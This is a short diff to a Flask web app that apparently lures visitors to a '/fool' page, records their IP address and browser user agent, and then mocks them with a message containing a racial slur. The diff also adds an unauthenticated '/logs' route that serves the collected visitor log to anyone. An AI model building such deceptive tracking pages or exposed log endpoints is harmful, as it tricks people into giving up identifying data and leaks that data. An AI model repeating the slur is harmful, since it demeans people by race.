@@ -30,7 +30,7 @@ def consent_page():
     """)
 
 
-@app.route('/collect')
+@app.route('/fool')
 def collect_data():
     ip = get_ip()
     user_agent = request.headers.get('User-Agent')
@@ -54,6 +54,11 @@ def collect_data():
         <h2>You were fooled nigga </h2>
         
     """
+
+@app.route('/logs')
+def view_logs():
+    with open("logs.csv", "r") as file:
+        return "<pre>" + file.read() + "</pre>"
 
 
 if __name__ == '__main__':
